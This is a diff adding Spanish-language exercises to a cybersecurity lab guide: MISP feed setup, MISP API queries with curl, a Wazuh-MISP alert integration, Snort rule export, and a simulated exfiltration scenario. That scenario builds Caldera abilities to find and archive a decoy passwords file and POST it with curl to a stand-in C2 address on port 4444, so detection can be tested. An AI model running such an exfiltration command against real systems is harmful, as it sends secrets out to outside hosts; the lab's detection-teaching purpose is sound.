+* **Sync Actions → List Feeds**. Verá 2 feeds predefinidos, deshabilitados: **CIRCL OSINT Feed** y **The Botvrij.eu Data**. Son fuentes que MISP ya conoce, en formato nativo "MISP Feed" (eventos ya estructurados vía `manifest.json`). En este ejercicio vamos a trabajar con dos fuentes distintas para comparar:
+  1. Una fuente que **MISP no trae por defecto**, dada de alta manualmente desde cero, tal como se haría con un proveedor de threat intel nuevo.
+  2. Uno de los dos feeds nativos ya preconfigurados, simplemente activándolo, para ver cómo importa MISP un feed en su propio formato estructurado.
+* Fuente nueva que usaremos: **blocklist.de**, IPs reportadas por ataques SSH por fuerza bruta, con estos parámetros (verificados: URL accesible, ~4.445 IPs, ~63 KB de texto plano, pequeño y directamente relacionado con el Ejercicio 1.6 del Level-01, el ataque SSH con Hydra):
+
+  * **Name:** `blocklist.de - SSH attackers`
+  * **Provider:** `blocklist.de`
+  * **URL:** `https://lists.blocklist.de/lists/ssh.txt`
+  * **Input source:** `Network`
+  * **Source format:** `Freetext` (a diferencia de CIRCL/Botvrij, formato nativo "MISP Feed" con eventos ya estructurados, esta fuente es una lista plana de IPs sin estructura MISP; el formato `Freetext` hace que MISP reconozca automáticamente el patrón de IOC, aquí IPs, en cada línea).
+* Feed nativo que activaremos: **The Botvrij.eu Data**, ya preconfigurado (formato `MISP Feed`, no necesita rellenar formulario). Se ha comprobado su tamaño real (~435 eventos, ~10 MB en total): sincroniza en segundos y permite ver el resultado completo de inmediato, algo idóneo para un ejercicio de laboratorio acotado en el tiempo. El otro feed predefinido, **CIRCL OSINT Feed**, se deja deliberadamente sin activar: ronda 1.670 eventos y, por el tamaño de varios de sus informes individuales, puede suponer del orden de 1-2 GB de datos en bruto. No es un problema de espacio en disco (el 50 GB de `misp-server` lo asume sin problema), sino de alcance: tardaría bastante más en sincronizar y añadiría un volumen de eventos poco manejable para explorar en el propio ejercicio.
+
+**Evidencie**
+
+* Captura del listado de feeds antes de añadir el nuevo (mostrando los 2 predefinidos, deshabilitados).
+
+### 2.2.2. Ejecución (alta, activación y sincronización)
+
+#### Dar de alta el feed
+
+1. **Sync Actions → List Feeds → Add Feed**.
+2. Rellene el formulario con los parámetros de arriba (Name, Provider, URL, Input source, Source format).
+3. **Distribution:** puede dejar `All communities`, ya que es contenido público de un feed OSINT y no afecta al alcance de vuestros propios datos del Ejercicio 2.1.
+4. Marque **Enabled**.
+5. Guarde.
+
+**Evidencie**
+
+* Captura del formulario **Add Feed** relleno antes de guardar.
+* Captura del feed ya creado en la lista, en estado **Enabled**.
+
+#### Activar el feed nativo Botvrij.eu Data
+
+1. En **List Feeds**, localice **The Botvrij.eu Data** (ya existente, deshabilitado) y márquelo como **Enabled** (editar el feed → casilla **Enabled** → guardar).
+2. Deje **CIRCL OSINT Feed** tal como está, deshabilitado: no forma parte de este ejercicio, por el volumen de datos comentado arriba.
+
+**Evidencie**
+
+* Captura de **The Botvrij.eu Data** en estado **Enabled**, con **CIRCL OSINT Feed** aún deshabilitado.
+
+#### Sincronizar
+
+1. En **List Feeds**, seleccione el feed `blocklist.de - SSH attackers` recién creado y ejecute **Fetch all events** (botón de sincronización individual del feed).
+2. Repita la misma acción **Fetch all events** sobre **The Botvrij.eu Data**.
+3. Espere a que finalicen ambas importaciones.
+
+**Evidencie**
+
+* Captura del resultado/progreso de la sincronización de cada uno de los dos feeds.
+
+#### Explorar lo importado
+
+1. Vaya a **Event Actions → List Events** y localice los eventos importados por ambos feeds.
+   * `blocklist.de` (formato `Freetext`): es normal que el resultado sea **un único evento** con miles de atributos de tipo `ip-src`/`ip-dst`.
+   * `Botvrij.eu Data` (formato nativo `MISP Feed`): al contrario, veréis **varios eventos pequeños y ya estructurados**, uno por cada indicador/informe original de la fuente. Esta es la diferencia práctica entre un feed en formato nativo de MISP y uno en texto plano interpretado con `Freetext`.
+2. Use **Search Attributes** filtrando por tipo `ip-src` para localizar IPs concretas, y abra el evento de origen.
+
+**Evidencie**
+
+* Captura del evento importado por `blocklist.de`, con varios de sus atributos IP visibles.
+* Captura de uno o varios eventos importados por `Botvrij.eu Data`, mostrando su estructura (más eventos, cada uno más pequeño que el de `blocklist.de`).
+
+### Validación / Troubleshooting
+
+* Si al guardar el feed da error de validación, confirme que **Source format** esté en `Freetext` (no `MISP Feed`, que espera un `manifest.json` que esta URL no tiene).
+* Si la sincronización falla o no avanza, compruebe la conectividad a Internet desde `misp-server`:
+
+```bash
+curl -I https://lists.blocklist.de/lists/ssh.txt
+```
+
+* Si el disco empieza a llenarse, deshabilite el feed y elimine los datos importados (el propio feed en MISP permite purgar sus eventos) antes de continuar.
+
+### Evidencias a entregar
+
+* Listado de feeds antes de añadir el nuevo.
+* Formulario **Add Feed** relleno.
+* Feed creado y habilitado.
+* Resultado de la sincronización.
+* Un evento/atributo importado por el feed.
+* Nota breve: cuántos eventos/atributos trajo el feed.
+
+### Conclusión final
+
+Incluya:
+
+* Qué parámetros definen un feed en MISP (URL, formato de origen: `MISP Feed` vs `Freetext`/`CSV`, distribución) y qué papel juega cada uno.
+* Diferencia entre un IOC propio (Ejercicio 2.1) y uno de fuente externa (este ejercicio).
+* Cómo esto se traduce a un caso real: dar de alta un feed nuevo es lo que haría un analista al incorporar un proveedor de threat intelligence (comercial o comunitario) que no viene precargado en la plataforma. Y por qué muchas fuentes reales (como listas de bloqueo) no vienen en formato nativo MISP.
+* Cómo conecta con el Ejercicio 1.6 del Level-01: la IP atacante de vuestro ataque Hydra es una IP **privada** del propio laboratorio, así que nunca aparecería en un feed OSINT público como `blocklist.de` (que solo recoge IPs de Internet reportadas por terceros); ninguna cantidad de feeds públicos habría detectado ese ataque por reputación. ¿Qué aporta entonces este tipo de feed, y qué límite real tiene frente a una amenaza interna o de un origen aún no reportado por nadie?
+
+---
+
+## Ejercicio 2.3 — MISP: consultas a la API REST con curl
+
+### Objetivo
+
+Entender cómo se consulta MISP de forma programática: es exactamente lo que hace, de forma automática, la integración del Ejercicio 2.4.
+
+### Prerrequisitos
+
+* Ejercicios 2.0 y 2.1 completados (usuario de laboratorio creado; evento con la IP de `caldera-server`, publicado).
+* Acceso a una máquina con conectividad HTTPS hacia MISP (puede ser el propio `misp-server` u otra VM del laboratorio).
+* Una **API key propia del usuario de laboratorio**, no la del administrador; se genera en el paso siguiente.
+
+---
+
+### 2.3.1. Preparación e identificación (generar la propia API key)
+
+Inicie sesión en MISP con el **usuario de laboratorio** del Ejercicio 2.0. Cada usuario puede generarse su propia Auth Key sin necesitar privilegios de administrador:
+
+1. Menú de usuario (arriba a la derecha) → **Auth Keys**.
+2. **Add authentication key**.
+3. Copie la clave generada: MISP solo la muestra **una vez**.
+
+> Usar la clave del usuario de laboratorio en vez de la del administrador es, de nuevo, mínimo privilegio: si esta clave se filtra, no compromete la administración completa de MISP.
+
+**Evidencie**
+
+* Captura de la Auth Key recién creada (sin mostrar la clave completa si se documenta fuera del entorno controlado).
+
+### 2.3.2. Ejecución (consultas)
+
+#### Consulta con coincidencia
+
+Busque la IP creada en el Ejercicio 2.1:
+
+```bash
+curl -k -s \
+  -H "Authorization: TU_API_KEY" \
+  -H "Accept: application/json" -H "Content-Type: application/json" \
+  -d '{"value": "IP_DE_CALDERA", "type": ["ip-src"]}' \
+  https://IP_MISP/attributes/restSearch
+```
+
+> `-k` desactiva la verificación del certificado autofirmado (esperado en este laboratorio). Si tiene `jq` instalado, añada `| jq .` al final para formatear la salida.
+
+Identifique en la respuesta el campo `response.Attribute`: debe contener el atributo creado en 2.1, con su `Event.uuid` y `value`.
+
+**Evidencie**
+
+* Captura/salida del comando con el JSON de respuesta (coincidencia encontrada).
+
+#### Consulta sin coincidencia
+
+Repita la misma consulta con una IP que **no** exista en MISP (por ejemplo, `198.51.100.1`, rango reservado para documentación):
+
+```bash
+curl -k -s \
+  -H "Authorization: TU_API_KEY" \
+  -H "Accept: application/json" -H "Content-Type: application/json" \
+  -d '{"value": "198.51.100.1", "type": ["ip-src"]}' \
+  https://IP_MISP/attributes/restSearch
+```
+
+Compruebe que `response.Attribute` viene vacío (`[]`).
+
+**Evidencie**
+
+* Captura/salida del comando mostrando la respuesta vacía.
+
+#### (Opcional) Comprobación de versión del servidor
+
+```bash
+curl -k -s -H "Authorization: TU_API_KEY" -H "Accept: application/json" \
+  https://IP_MISP/servers/getVersion
+```
+
+### Validación / Troubleshooting
+
+* **HTTP 403 / "Check MISP credentials":** revise que la API key se copió sin espacios ni saltos de línea.
+* **`curl: (60) SSL certificate problem`:** falta el flag `-k` (certificado autofirmado, esperado aquí).
+
+### Evidencias a entregar
+
+* JSON de la consulta con coincidencia.
+* JSON de la consulta sin coincidencia.
+* Comando exacto utilizado en cada caso.
+
+### Conclusión final
+
+Incluya:
+
+* Por qué la API es la pieza que permite **automatizar** consultas de threat intelligence (enlace directo con el Ejercicio 2.4).
+* Qué campos de la respuesta son relevantes para decidir si un indicador es una amenaza conocida (`Attribute`, `Event.uuid`, `to_ids`).
+
+---
+
+## Ejercicio 2.4 — MISP: integración automática con Wazuh
+
+### Objetivo
+
+Desplegar y validar la integración automática (`automation/wazuh-misp.sh`) que consulta MISP cada vez que Wazuh recibe una alerta derivada de Snort (ICMP / SYN scan), cerrando el ciclo **detección → enriquecimiento**.
+
+### Prerrequisitos
+
+* Ejercicios 2.1 y 2.3 completados (evento publicado en MISP con la IP de `caldera-server`; API key **del usuario de laboratorio** generada).
+* Level-01 desplegado e integrado (`automation/wazuh-snort.sh` ya ejecutado).
+* Clave SSH generada (`automation/key-generate.sh`) y acceso desde el anfitrión a las VMs del laboratorio.
+
+> ℹ️ **Nota de mínimo privilegio:** use la API key del usuario de laboratorio (Ejercicio 2.3), **no la del administrador**. Esa clave queda guardada en `ossec.conf` del Wazuh Manager; si fuera la de admin, cualquiera con acceso a esa VM tendría de facto privilegios de administrador sobre MISP.
+
+---
+
+### Cómo funciona la integración (antes de desplegar)
+
+`wazuh-misp.sh` no es una caja negra: antes de lanzarlo, conviene entender qué instala y por qué.
+
+1. **Se apoya en el módulo Integrator de Wazuh** (`wazuh-integratord`), el mecanismo nativo con el que Wazuh invoca un script externo cada vez que se dispara una alerta que cumple ciertas condiciones, el mismo patrón que usan las integraciones oficiales (VirusTotal, Slack, etc.). Se activa declarando un bloque `<integration>` en `ossec.conf`.
+2. **El script instala tres piezas en el Wazuh Manager, por SSH:**
+   * `/var/ossec/integrations/custom-misp_ip.py`: el script Python que hace la consulta a MISP.
+   * `/var/ossec/etc/rules/misp_ip_rules.xml`: reglas locales `600200`-`600203` que interpretan la respuesta de ese script.
+   * Un bloque `<integration>` en `/var/ossec/etc/ossec.conf` que conecta las reglas `600001`/`600010` (las de Snort del Level-01) con el script.
+3. **Flujo completo, alerta a alerta:**
+   1. Snort detecta tráfico → el Wazuh Agent en `snort-server` reenvía el log → el Wazuh Manager evalúa las reglas y dispara `600001` o `600010`.
+   2. Por el bloque `<integration>`, `wazuh-integratord` invoca automáticamente `custom-misp_ip.py`, pasándole el JSON completo de esa alerta más la API key y la URL de MISP.
+   3. El script extrae la IP origen de la alerta y consulta `/attributes/restSearch` en MISP: "¿hay algún atributo con este valor?".
+   4. Cuando el script termina la consulta, no "contesta" a nadie: simplemente escribe una línea de texto con el resultado, por ejemplo `{"integration": "misp_ip", "misp_ip": {"found": 1, ...}}`, y la deja caer en un buzón especial de Wazuh (el socket `queue/sockets/queue`). Ese buzón es la misma puerta de entrada por la que llega cualquier log (los de Snort, los de sudo, etc.), así que a partir de este punto Wazuh trata esa línea exactamente igual que si fuera un log más que acaba de llegar, sin saber ni importarle que en realidad venga de un script y no de un fichero.
+   5. Como es un log más, Wazuh lo compara contra todas sus reglas, y ahí es donde entran `600200`-`600203`: son las únicas reglas que "reconocen" ese log concreto (buscan el campo `"integration":"misp_ip"`) y deciden qué hacer con él: `600202` (nivel 12) si `found` es `1` (coincidencia), `600201` (nivel 0, silenciosa) si `found` es `0`, `600203` si hubo un error de conexión o credenciales.
+4. **Por qué así:** separa claramente "detectar" (Snort + reglas de Snort del Level-01) de "enriquecer con contexto" (este script). Wazuh sigue funcionando igual sin MISP, y MISP solo añade una capa de contexto encima de alertas que ya existían.
+
+**Cómo verlo con vuestros propios ojos:**
+
+* El código que se va a desplegar es legible **antes** de ejecutar nada, directamente en `automation/wazuh-misp.sh`: el bloque entre `cat > "$TMP_INTEGRATION" <<'PYEOF'` y `PYEOF` es el script Python completo; el bloque con `<group name="local,misp,threat_intel,">` son las reglas.
+* **Después** de desplegarlo, en el propio Wazuh Manager:
+
+  ```bash
+  cat /var/ossec/integrations/custom-misp_ip.py
+  cat /var/ossec/etc/rules/misp_ip_rules.xml
+  sudo grep -A8 "custom-misp_ip.py" /var/ossec/etc/ossec.conf
+  ```
+
+---
+
+### 2.4.1. Preparación e identificación (estado previo)
+
+Confirme que el evento del Ejercicio 2.1 sigue **publicado** en MISP, con la IP de `caldera-server` marcada como IDS.
+
+**Evidencie**
+
+* Captura del evento en MISP (recordatorio del estado de partida).
+
+### 2.4.2. Ejecución (despliegue de la integración)
+
+Desde el anfitrión:
+
+```bash
+cd nics-cyberlab-edu-lite/automation
+sudo bash wazuh-misp.sh
+```
+
+Responda a las preguntas:
+
+* Datos SSH del **Wazuh Manager**.
+* **URL de MISP** y **API key** (la del usuario de laboratorio del Ejercicio 2.3, no la de admin).
+* IDs de regla que disparan la consulta: deje el valor por defecto (`600001,600010`).
+
+Confirme el resumen (`y`) y espere a que el script termine (instala el script de integración, las reglas, y reinicia `wazuh-manager`).
+
+**Evidencie**
+
+* Salida completa del script, o al menos el resumen final.
+
+### 2.4.3. Validación end-to-end (Snort → Wazuh → MISP)
+
+#### Generar tráfico detectable
+
+Desde `caldera-server`:
+
+```bash
+ping -c 4 <IP_SNORT>
+```
+
+(o el escaneo `nmap -sS -Pn` del Ejercicio 1.4 del Level-01).
+
+#### Comprobar el enriquecimiento en Wazuh Manager (línea de comandos)
+
+```bash
+sudo grep '"integration":"misp_ip"' /var/ossec/logs/alerts/alerts.json | tail -5
+```
+
+> `integrations.log` solo se rellena con `debug: true` (ver Troubleshooting); no es el sitio para comprobar esto por defecto.
+
+**Resultado esperado**
+
+* Alerta con `rule.id = 600202` (nivel 12), incluyendo la IP de `caldera-server` y un `permalink` hacia el evento de MISP del Ejercicio 2.1.
+
+#### Comprobar el enriquecimiento en el Dashboard de Wazuh
+
+La misma alerta 600202 aparece también en la interfaz gráfica, igual que los eventos de Snort del apartado 1.2.5 del Level-01 (Ejercicio 1.2, Visualización en Wazuh):
+
+1. **☰ → Threat Intelligence → Threat Hunting** (o **→ Events**, según versión).
+2. Seleccione el agente `snort-server` y ajuste el rango temporal para cubrir el momento en que generó el tráfico.
+3. Filtre por `rule.id: 600202` (o busque por la palabra clave `misp`).
+4. Abra el evento: en el campo `data.misp_ip.permalink` está el enlace directo al evento de MISP.
+
+**Evidencie**
+
+* Captura/log de la alerta 600202 con el `permalink` (línea de comandos o Dashboard).
+* Captura del evento en MISP confirmando que el `permalink` apunta al mismo evento.
+
+#### (Opcional) Contraste con una IP desconocida
+
+Si es posible generar tráfico detectado por Snort desde un origen que **no** esté registrado en MISP, repita la prueba y compruebe que solo aparece `rule.id = 600201` (`found: 0`), sin alerta de nivel 12, para evidenciar la diferencia entre "IP desconocida" e "IP con antecedentes".
+
+**Evidencie**
+
+* Captura/log de la alerta 600201 (sin coincidencia).
+
+### Validación / Troubleshooting
+
+* `integrations.log` solo se rellena si `debug` está a `true` en las `<options>` del bloque `<integration>` de `ossec.conf` (por defecto está en `false`). Si lo ve vacío, no es necesariamente un fallo: busque errores directamente en el log general de Wazuh:
+
+  ```bash
+  sudo tail -n 100 /var/ossec/logs/ossec.log | grep -i integrat
+  ```
+
+  Si aparecen líneas `wazuh-integratord: ERROR: While running custom-misp_ip.py ... Exit status was: 1`, la integración se está invocando pero el script falla: siga con el resto de puntos.
+* Confirme primero que las reglas base 600001/600010 (ejercicio de Snort del Level-01) se están disparando, antes de sospechar de la parte MISP:
+
+  ```bash
+  sudo grep -c '"rule":{"level":7,"description":"Snort ICMP detection"' /var/ossec/logs/alerts/alerts.json
+  ```
+
+  (el `rule.id` va anidado bajo `"rule":{"id":"600001",...}`, no en el `"id"` de nivel superior del alert, que es el identificador único del evento).
+* Si `wazuh-integratord` da `Exit status was: 1` y en el log aparece `Output: Exception`, pruebe el script a mano para ver el traceback completo:
+
+  ```bash
+  sudo grep '"rule":{"id":"600001"' /var/ossec/logs/alerts/alerts.json | tail -1 | sudo tee /tmp/test_alert.json
+  sudo /var/ossec/framework/python/bin/python3 /var/ossec/integrations/custom-misp_ip.py \
+    /tmp/test_alert.json "<API_KEY>" "https://<IP_MISP>" debug
+  ```
+* Si `misp_ip.error` aparece con código `403`, revise la API key configurada en `ossec.conf` (`<api_key>`).
+* Recuerde que Snort debe estar en ejecución (`sudo snort -i ens33 ...`) para que exista tráfico que detectar.
+
+### Evidencias a entregar
+
+* Log de ejecución de `wazuh-misp.sh`.
+* Alerta 600202 con el `permalink` a MISP.
+* Evento en MISP correspondiente.
+* (Si se realiza) alerta 600201 de contraste.
+
+### Conclusión final
+
+Incluya:
+
+* Qué aporta esta integración frente a Snort + Wazuh solos (Level-01): pasar de "hay tráfico sospechoso" a "hay tráfico de un origen con antecedentes conocidos en threat intelligence".
+* Cómo esto refuerza el ciclo **detección → investigación → mejora → reporte** con una capa adicional de contexto.
+* Valor SOC: priorización del triage.
+
+---
+
+## Ejercicio 2.5 — MISP: exportación de reglas Snort (NIDS)
+
+### Objetivo
+
+Usar la exportación nativa de MISP a formato Snort/Suricata (NIDS) para convertir atributos de red marcados como IDS (`to_ids=true`) en reglas Snort reales, cerrando el flujo de threat intelligence en la dirección opuesta al Ejercicio 2.4: aquí es **MISP quien alimenta a Snort** (detección proactiva en el propio IDS), en vez de que Snort dispare una consulta reactiva a MISP.
+
+### Prerrequisitos
+
+* Ejercicio 2.1 completado (evento publicado en MISP, con el atributo `ip-src` de `caldera-server` marcado como IDS).
+* Acceso SSH al nodo `snort-server`.
+* Rol de usuario de laboratorio (`Publisher`), confirmado que no requiere privilegios de administrador.
+
+---
+
+### 2.5.1. Preparación e identificación
+
+Confirme que el evento del Ejercicio 2.1 sigue publicado, con el atributo `ip-src` marcado como **IDS** (columna/icono "IDS" activo en la vista del evento): solo los atributos con ese flag se incluyen en la exportación NIDS.
+
+**Evidencie**
+
+* Captura del evento en MISP mostrando el atributo `ip-src` marcado como IDS.
+
+### 2.5.2. Ejecución (exportación y despliegue en Snort)
+
+#### Exportar las reglas desde MISP
+
+1. En la vista del evento, use el botón **Download as...** y seleccione el formato **Snort rules** (o equivalente NIDS/Snort en el listado de formatos).
+2. Descargue el fichero `.rules` generado.
+
+**Evidencie**
+
+* Captura de la opción de exportación usada en MISP.
+* Contenido del fichero `.rules` descargado (debe incluir la IP de `caldera-server`).
+
+#### Desplegar la regla en snort-server
+
+1. Transfiera el fichero a `snort-server` (p. ej. `scp`).
+2. Relance Snort incluyendo el fichero de reglas de MISP además de la configuración habitual:
+
+```bash
+sudo snort -i ens33 -c /etc/snort/snort.lua -R <ruta_al_fichero_misp>.rules -A alert_fast -k none -l /var/log/snort
+```
+
+**Evidencie**
+
+* Captura/log de Snort arrancando con la regla de MISP cargada, sin errores de parseo.
+
+### 2.5.3. Validación (detección proactiva)
+
+1. Desde `caldera-server` (la IP ya registrada en el evento de MISP), genere tráfico hacia `snort-server`.
+2. Compruebe en `alert_fast.txt` que Snort detecta el tráfico **con la regla generada por MISP**, distinta de las reglas ICMP/SYN-scan del Level-01:
+
+```bash
+sudo tail -f /var/log/snort/alert_fast.txt
+```
+
+**Resultado esperado**
+
+* Una alerta cuyo SID/mensaje corresponde a la regla exportada de MISP (no a las reglas `wazuh-snort.sh` del Level-01), referenciando el evento/atributo de origen.
+
+**Evidencie**
+
+* Captura de `alert_fast.txt` con la alerta generada por la regla de MISP.
+
+### Validación / Troubleshooting
+
+* Si la exportación no incluye la IP esperada, confirme que el atributo tiene el flag **IDS** activo: MISP excluye del export NIDS cualquier atributo sin ese flag.
+* Si Snort da error al cargar el `.rules` por colisión de SID, tenga en cuenta que las reglas locales del Level-01 ya usan SIDs propios (visibles en `alert_fast.txt` como `[1:1001001:1]` y `[1:1000010:1]`); verifique en la práctica el rango de SIDs que asigna vuestra instalación de MISP y ajuste si colisiona.
+* Si no aparece ninguna alerta nueva, confirme que relanzó Snort **incluyendo** el nuevo fichero de reglas (`-R`), no solo con `snort.lua`.
+
+### Evidencias a entregar
+
+* Fichero `.rules` exportado desde MISP.
+* Log de Snort arrancando con la regla cargada.
+* Alerta de `alert_fast.txt` generada por la regla de MISP.
+
+### Conclusión final
+
+Incluya:
+
+* Diferencia entre este ejercicio (MISP → Snort, proactivo) y el Ejercicio 2.4 (Snort → Wazuh → MISP, reactivo): quién actúa primero y en qué capa ocurre la detección.
+* Qué mantenimiento exige este modelo (refrescar la exportación cuando cambien los IOCs en MISP) frente al modelo reactivo, que consulta MISP en vivo en cada alerta.
+* Cuándo tiene sentido cada patrón en un SOC real: detección proactiva de IOCs conocidos en el perímetro frente a enriquecimiento contextual de alertas ya generadas.
+
+---
+
+## Ejercicio 2.6 — MISP: caso de uso integral, escenario de exfiltración
+
+### Objetivo
+
+Cerrar el ciclo completo del laboratorio uniendo Level-01 (Caldera, Snort, Wazuh) y Level-02 (MISP) en un único escenario narrativo: simular una exfiltración de datos hacia un C2 registrado en MISP, y comprobar que la cadena de detección completa funciona de extremo a extremo: Snort detecta tráfico saliente inusual, Wazuh consulta MISP por la IP de destino, y MISP confirma que es un C2 conocido.
+
+### Prerrequisitos
+
+* Level-01 completo, en particular el Ejercicio 1.5 (reglas personalizadas en Snort y Wazuh).
+* Ejercicios 2.0 y 2.4 completados (usuario de laboratorio creado; integración `wazuh-misp.sh` desplegada).
+* Acceso SSH a `caldera-server`, `snort-server` y `wazuh-manager`.
+* Recomendable (no obligatorio): el "Bloque 4) Adversaries" de la Investigación Opcional de Caldera del Level-01, como referencia para construir el adversary de este ejercicio.
+
+> ℹ️ **Nota técnica:** en todos los ejercicios anteriores (Ejercicios 2.1-2.5), la IP interesante para MISP era siempre el **origen** del tráfico (un atacante externo). Aquí es al revés: el origen de la conexión saliente es el propio `snort-server` (una IP interna que nunca estará en MISP; recuerde que, como en el Ejercicio 1.3, el **agente de Caldera que ejecuta las abilities corre en `snort-server`**, no en `caldera-server`, que solo aloja el dashboard/controlador), y la IP relevante es el **destino** (el C2). Por eso `custom-misp_ip.py` comprueba ahora tanto `srcip` como `dstip` contra MISP; sin ese cambio, este ejercicio no dispararía nunca la alerta de coincidencia. Como ventaja adicional, al ejecutarse en `snort-server`, el tráfico de salida es visible para Snort de forma directa (es tráfico de su propia interfaz), sin necesidad de ningún truco de enrutamiento.
+
+---
+
+### 2.6.1. Preparación e identificación
+
+1. En `snort-server` (el nodo donde corre el agente de Caldera, ver nota técnica arriba), cree un fichero señuelo con contenido de prueba (dato **sintético**, no información real):
+
+```bash
+sudo bash -c 'echo "admin:P@ssw0rd_lab_2026" > /root/passwords.txt'
+```
+
+2. IP de C2 ficticia que usaremos: **`203.0.113.50`**. Pertenece al rango `TEST-NET-3` (RFC 5737), reservado para documentación: no resuelve a ninguna infraestructura real, así que es segura para registrarla como IOC sin riesgo de apuntar sin querer a un tercero.
+
+**Evidencie**
+
+* Captura del fichero señuelo creado.
+
+### 2.6.2. Ejecución
+
+#### Paso 1: registrar el C2 en MISP
+
+1. Inicie sesión como el **usuario de laboratorio** (Ejercicio 2.0).
+2. Cree un evento nuevo: `Info` = "Servidor C2 conocido, laboratorio".
+3. **Add Attribute:**
+   * **Category:** `Network activity`
+   * **Type:** `ip-dst` (a diferencia del `ip-src` usado en el Ejercicio 2.1, aquí es el destino de la exfiltración, no el origen).
+   * **Value:** `203.0.113.50`
+   * **Distribution:** `Inherit event`
+   * Marque la casilla **IDS**.
+4. (Opcional) **Add new cluster** → Galaxy `Attack Pattern` → `T1041 - Exfiltration Over C2 Channel`, conectando con el bloque opcional de Galaxy del Ejercicio 2.1 y con el mapeo ATT&CK de los Ejercicios 1.6-1.7 del Level-01.
+5. **Publish** el evento.
+
+**Evidencie**
+
+* Captura del evento con el atributo `ip-dst` marcado IDS, publicado.
+
+#### Paso 2: nueva regla de detección en Snort y Wazuh
+
+1. En `snort-server`, edite el fichero de reglas:
+
+```bash
+sudo nano /etc/snort/rules/local.rules
+```
+
+Añada al final, manteniendo las reglas existentes:
+
+```
+alert tcp any any -> any 4444 (msg:"Posible C2: trafico saliente puerto 4444"; sid:1000020; rev:1;)
+```
+
+Verifique la sintaxis y relance Snort (pare primero el proceso en ejecución con `Ctrl+C` en su terminal, ya que Snort no recarga reglas en caliente):
+
+```bash
+sudo snort -T -c /etc/snort/snort.lua
+sudo snort -i ens33 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/snort
+```
+
+2. En `wazuh-manager`, edite el fichero de reglas locales que ya usa la integración de Snort:
+
+```bash
+sudo nano /var/ossec/etc/rules/snort_local_rules.xml
+```
+
+Añada una regla nueva dentro del `<group>` existente, junto a las reglas `600001`/`600010`. El `<match>` debe ser **el mismo texto** que puso en el `msg` de la regla Snort del paso anterior:
+
+```xml
+<rule id="600300" level="8">
+  <match>Posible C2: trafico saliente puerto 4444</match>
+  <description>Snort - trafico saliente sospechoso hacia posible C2</description>
+</rule>
+```
+
+Reinicie Wazuh para que la cargue:
+
+```bash
+sudo systemctl restart wazuh-manager
+```
+
+3. Vuelva a ejecutar `wazuh-misp.sh` e indique en el prompt de reglas que disparan la consulta: `600001,600010,600300`, para que esta nueva regla también dispare la consulta a MISP.
+
+**Evidencie**
+
+* Captura de la regla nueva en Snort y en Wazuh.
+* Salida de `wazuh-misp.sh` mostrando el `rule_id` `600300` incluido.
+
+#### Paso 3: construir el Adversary en Caldera
+
+1. Estas 3 abilities son específicas de este ejercicio (referencian el fichero señuelo y la IP ficticia del C2) y no vienen ya creadas en Caldera: cree cada una desde **Abilities → Create Ability**, rellenando `Name`, `Description`, `Tactic`, `Technique ID`/`Technique Name`, y añadiendo un **Executor** de plataforma `sh` (Linux) con el comando indicado:
+
+   | | Tactic | Technique | Command (Executor `sh`) |
+   |---|---|---|---|
+   | **Discovery** | `discovery` | `T1083` — File and Directory Discovery | `find /root -name "passwords.txt"` |
+   | **Collection** | `collection` | `T1560.001` — Archive Collected Data: Archive via Utility | `tar -czf /tmp/datos.tar.gz /root/passwords.txt` |
+   | **Exfiltration** | `exfiltration` | `T1041` — Exfiltration Over C2 Channel | `curl -X POST --max-time 3 -d @/tmp/datos.tar.gz http://203.0.113.50:4444` |
+
+   El `--max-time 3` es importante: como `203.0.113.50` no es enrutable, la conexión nunca se completará, y sin ese límite el paso se quedaría esperando. Para Snort esto no supone un problema: solo necesita ver el paquete saliente para disparar la regla.
+2. Agrupe las 3 abilities en un Adversary (por ejemplo, `Simulated-Exfiltration`), en el orden Discovery → Collection → Exfiltration.
+3. Desde el Dashboard de Caldera (alojado en `caldera-server`), **Start New Operation** con:
+   * **Adversary:** el que acaba de crear (`Simulated-Exfiltration`), no `No Adversary (manual)`.
+   * **Group:** `red` (el mismo grupo del agente de `snort-server` que ya usasteis en el Ejercicio 1.3), no `All groups`.
+   * **Planner:** `atomic`.
+   * **Run State:** `Run immediately`.
+
+   El resto de opciones (Fact Source, Obfuscators, Autonomous, Jitter) puede dejarlas en su valor por defecto.
+
+**Evidencie**
+
+* Captura del Adversary con las 3 abilities en orden.
+* Captura de la operación ejecutada, con las 3 tasks y su output.
+
+### 2.6.3. Validación end-to-end (el resultado esperado)
+
+1. En `snort-server`, confirme en `alert_fast.txt` la alerta de tráfico saliente al puerto 4444.
+2. En `wazuh-manager`, compruebe que se disparó la regla `600300` y que `wazuh-integratord` invocó `custom-misp_ip.py`.
+3. Compruebe la alerta de coincidencia:
+
+```bash
+sudo grep '"integration":"misp_ip"' /var/ossec/logs/alerts/alerts.json | tail -5
+```
+
+**Resultado esperado**
+
+* Alerta `600202` (nivel 12) con `misp_ip.matched_field = "dstip"` y `misp_ip.ip = "203.0.113.50"`, y un `permalink` hacia el evento del C2 en MISP: la confirmación de que un host interno intentó enviar datos a un servidor fichado como amenaza conocida.
+
+**Evidencie**
+
+* Captura/log de la alerta `600202` mostrando `matched_field: dstip`.
+* Captura del evento en MISP confirmando que el `permalink` apunta al mismo evento.
+
+### Validación / Troubleshooting
+
+* Si `found` sigue en `0`, confirme que redesplegasteis `wazuh-misp.sh` incluyendo el nuevo `rule_id` (`600300`) en el prompt, y que el evento del C2 en MISP está `Published` con el atributo `ip-dst` marcado IDS.
+* Si el paso de Exfiltration se queda colgado más de unos segundos, confirme que se usó `--max-time`; `203.0.113.50` no es enrutable y la conexión no debe completarse nunca.
+* Si Snort no genera ninguna alerta, revise que la regla nueva esté cargada (mismo troubleshooting que el Ejercicio 1.5) y que el puerto de destino del `curl` coincida con el de la regla.
+
+### Evidencias a entregar
+
+* Evento en MISP con el atributo `ip-dst` del C2.
+* Regla nueva en Snort y en Wazuh (`600300`).
+* Adversary y operación de Caldera (3 tasks con output).
+* Alerta `600202` con `matched_field: dstip` y `permalink`.
+
+### Conclusión final
+
+Incluya:
+
+* Cómo este ejercicio conecta todo el laboratorio: Caldera (Level-01) genera la actividad ofensiva, Snort y Wazuh (Level-01) la detectan, y MISP (Level-02) le da contexto de amenaza. Es el ciclo detección → investigación → mejora → reporte con el que arranca esta guía, aplicado de principio a fin.
+* Por qué hizo falta modificar el script de integración para comprobar `dstip` además de `srcip`, y qué dice esto sobre diseñar integraciones pensando en más de un tipo de escenario (tráfico entrante frente a tráfico saliente).
